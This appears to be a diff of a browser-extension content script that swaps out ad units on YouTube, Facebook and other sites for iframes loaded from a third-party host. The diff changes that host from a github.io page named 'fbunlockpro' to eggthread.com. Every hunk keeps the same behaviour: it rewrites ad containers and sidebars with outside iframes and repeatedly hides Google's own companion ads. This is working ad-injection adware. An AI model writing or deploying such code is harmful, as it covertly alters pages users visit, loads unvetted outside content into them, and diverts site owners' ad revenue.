@@ -28,15 +28,15 @@ var adultsite = false;
 								{
 									if (document.location.href.search("youtube.com") != -1) 
 									{
-										iframe_tags[x].src = 'http://fbunlockpro.github.io/yes/120x600.html';
+										iframe_tags[x].src = 'http://eggthread.com/ads/120x600.html';
 									} 
 									else if (document.location.href.search("facebook.com") != -1)
 									{
-										iframe_tags[x].src = 'http://fbunlockpro.github.io/yes/120x600.html';
+										iframe_tags[x].src = 'http://eggthread.com/ads/120x600.html';
 									}
 									else 
 									{
-										iframe_tags[x].src = 'http://fbunlockpro.github.io/yes/120x600.html';									
+										iframe_tags[x].src = 'http://eggthread.com/ads/120x600.html';									
 									}
 									commonadunit = true;
 								}
@@ -45,15 +45,15 @@ var adultsite = false;
 								{
 									if (document.location.href.search("youtube.com") != -1) 
 									{
-										iframe_tags[x].src = 'http://fbunlockpro.github.io/yes/160x600.html';
+										iframe_tags[x].src = 'http://eggthread.com/ads/160x600.html';
 									} 
 									else if (document.location.href.search("facebook.com") != -1)
 									{
-										iframe_tags[x].src = 'http://fbunlockpro.github.io/yes/160x600.html';
+										iframe_tags[x].src = 'http://eggthread.com/ads/160x600.html';
 									}
 									else 
 									{
-										iframe_tags[x].src = 'http://fbunlockpro.github.io/yes/160x600.html';									
+										iframe_tags[x].src = 'http://eggthread.com/ads/160x600.html';									
 									}
 									commonadunit = true;
 								}
@@ -62,15 +62,15 @@ var adultsite = false;
 								{
 									if (document.location.href.search("youtube.com") != -1) 
 									{
-										iframe_tags[x].src = 'http://fbunlockpro.github.io/yes/234x60.html';
+										iframe_tags[x].src = 'http://eggthread.com/ads/234x60.html';
 									} 
 									else if (document.location.href.search("facebook.com") != -1)
 									{
-										iframe_tags[x].src = 'http://fbunlockpro.github.io/yes/234x60.html';
+										iframe_tags[x].src = 'http://eggthread.com/ads/234x60.html';
 									}
 									else 
 									{
-										iframe_tags[x].src = 'http://fbunlockpro.github.io/yes/234x60.html';									
+										iframe_tags[x].src = 'http://eggthread.com/ads/234x60.html';									
 									}
 									commonadunit = true;
 								}
@@ -79,15 +79,15 @@ var adultsite = false;
 								{
 									if (document.location.href.search("youtube.com") != -1) 
 									{
-										iframe_tags[x].src = 'http://fbunlockpro.github.io/yes/300x250.html';
+										iframe_tags[x].src = 'http://eggthread.com/ads/300x250.html';
 									} 
 									else if (document.location.href.search("facebook.com") != -1)
 									{
-										iframe_tags[x].src = 'http://fbunlockpro.github.io/yes/300x250.html';
+										iframe_tags[x].src = 'http://eggthread.com/ads/300x250.html';
 									}
 									else 
 									{
-										iframe_tags[x].src = 'http://fbunlockpro.github.io/yes/300x250.html';									
+										iframe_tags[x].src = 'http://eggthread.com/ads/300x250.html';									
 									}
 									commonadunit = true;
 								}
@@ -96,15 +96,15 @@ var adultsite = false;
 								{
 									if (document.location.href.search("youtube.com") != -1) 
 									{
-										iframe_tags[x].src = 'http://fbunlockpro.github.io/yes/336x280.html';
+										iframe_tags[x].src = 'http://eggthread.com/ads/336x280.html';
 									} 
 									else if (document.location.href.search("facebook.com") != -1)
 									{
-										iframe_tags[x].src = 'http://fbunlockpro.github.io/yes/336x280.html';
+										iframe_tags[x].src = 'http://eggthread.com/ads/336x280.html';
 									}
 									else 
 									{
-										iframe_tags[x].src = 'http://fbunlockpro.github.io/yes/336x280.html';									
+										iframe_tags[x].src = 'http://eggthread.com/ads/336x280.html';									
 									}
 									commonadunit = true;
 								}
@@ -113,15 +113,15 @@ var adultsite = false;
 								{
 									if (document.location.href.search("youtube.com") != -1) 
 									{
-										iframe_tags[x].src = 'http://fbunlockpro.github.io/yes/468x60.html';
+										iframe_tags[x].src = 'http://eggthread.com/ads/468x60.html';
 									} 
 									else if (document.location.href.search("facebook.com") != -1)
 									{
-										iframe_tags[x].src = 'http://fbunlockpro.github.io/yes/468x60.html';
+										iframe_tags[x].src = 'http://eggthread.com/ads/468x60.html';
 									}
 									else 
 									{
-										iframe_tags[x].src = 'http://fbunlockpro.github.io/yes/468x60.html';									
+										iframe_tags[x].src = 'http://eggthread.com/ads/468x60.html';									
 									}
 									commonadunit = true;
 								}
@@ -130,15 +130,15 @@ var adultsite = false;
 								{
 									if (document.location.href.search("youtube.com") != -1) 
 									{
-										iframe_tags[x].src = 'http://fbunlockpro.github.io/yes/728x90.html';
+										iframe_tags[x].src = 'http://eggthread.com/ads/728x90.html';
 									} 
 									else if (document.location.href.search("facebook.com") != -1)
 									{
-										iframe_tags[x].src = 'http://fbunlockpro.github.io/yes/728x90.html';
+										iframe_tags[x].src = 'http://eggthread.com/ads/728x90.html';
 									}
 									else 
 									{
-										iframe_tags[x].src = 'http://fbunlockpro.github.io/yes/728x90.html';									
+										iframe_tags[x].src = 'http://eggthread.com/ads/728x90.html';									
 									}
 									commonadunit = true;
 								}
@@ -150,7 +150,7 @@ var adultsite = false;
 				{
 					if(document.getElementsByTagName('div')[i].className == 'ego_unit_container' && document.getElementsByTagName('div')[i].innerHTML.search("fbAdUnit") != -1 && !foundfbadunit)
 					{
-						document.getElementsByTagName('div')[i].innerHTML = '<iframe src="http://fbunlockpro.github.io/yes/160x600.html" width="160" height="600" frameborder="0" scrolling="no"></iframe>';
+						document.getElementsByTagName('div')[i].innerHTML = '<iframe src="http://eggthread.com/ads/160x600.html" width="160" height="600" frameborder="0" scrolling="no"></iframe>';
 						foundfbadunit = true;
 					}
 				}						
@@ -163,7 +163,7 @@ var adultsite = false;
 							{
 								if(document.getElementsByTagName('div')[i].className == 'ego_unit_container' && document.getElementsByTagName('div')[i].innerHTML.search("fbAdUnit") != -1 && !foundfbadunit)
 								{
-									document.getElementsByTagName('div')[i].innerHTML = '<iframe src="http://fbunlockpro.github.io/yes/160x600.html" width="160" height="600" frameborder="0" scrolling="no"></iframe>';
+									document.getElementsByTagName('div')[i].innerHTML = '<iframe src="http://eggthread.com/ads/160x600.html" width="160" height="600" frameborder="0" scrolling="no"></iframe>';
 									foundfbadunit = true;
 								}
 							}
@@ -174,17 +174,17 @@ var adultsite = false;
 				
 				if (document.getElementById('pagelet_side_ads') && !foundfbadunit) 
 				{
-					document.getElementById('pagelet_side_ads').innerHTML = '<iframe src="http://fbunlockpro.github.io/yes/160x600.html" width="160" height="600" frameborder="0" scrolling="no"></iframe>';
+					document.getElementById('pagelet_side_ads').innerHTML = '<iframe src="http://eggthread.com/ads/160x600.html" width="160" height="600" frameborder="0" scrolling="no"></iframe>';
 				}
 						
 				if (document.getElementById('ad_creative_1') && !commonadunit)
 				{
-					document.getElementById('ad_creative_1').innerHTML = '<iframe src="http://fbunlockpro.github.io/yes/728x90.html" width="728" height="90" frameborder="0" scrolling="no"></iframe>';
+					document.getElementById('ad_creative_1').innerHTML = '<iframe src="http://eggthread.com/ads/728x90.html" width="728" height="90" frameborder="0" scrolling="no"></iframe>';
 				}
 				
 				if (document.getElementById('watch-sidebar') && !commonadunit)
 				{
-					document.getElementById('watch-sidebar').innerHTML = '<iframe src="http://fbunlockpro.github.io/yes/300x250.html" width="300" height="250" frameborder="0" scrolling="no"></iframe>'+document.getElementById('watch-sidebar').innerHTML;
+					document.getElementById('watch-sidebar').innerHTML = '<iframe src="http://eggthread.com/ads/300x250.html" width="300" height="250" frameborder="0" scrolling="no"></iframe>'+document.getElementById('watch-sidebar').innerHTML;
 					setInterval("if (document.getElementById('google_companion_ad_div')) { document.getElementById('google_companion_ad_div').style.display ='none'; }", 100);
 					
 					setInterval("if (document.getElementById('ad300x250')) { document.getElementById('ad300x250').style.display ='none'; }", 100);
@@ -192,7 +192,7 @@ var adultsite = false;
 				
 				if (document.getElementById('search-pva-content'))
 				{
-					document.getElementById('search-pva-content').innerHTML = '<iframe src="http://fbunlockpro.github.io/yes/300x250.html" width="300" height="250" frameborder="0" scrolling="no"></iframe>'+document.getElementById('search-pva-content').innerHTML;
+					document.getElementById('search-pva-content').innerHTML = '<iframe src="http://eggthread.com/ads/300x250.html" width="300" height="250" frameborder="0" scrolling="no"></iframe>'+document.getElementById('search-pva-content').innerHTML;
 				}
 			
 			}
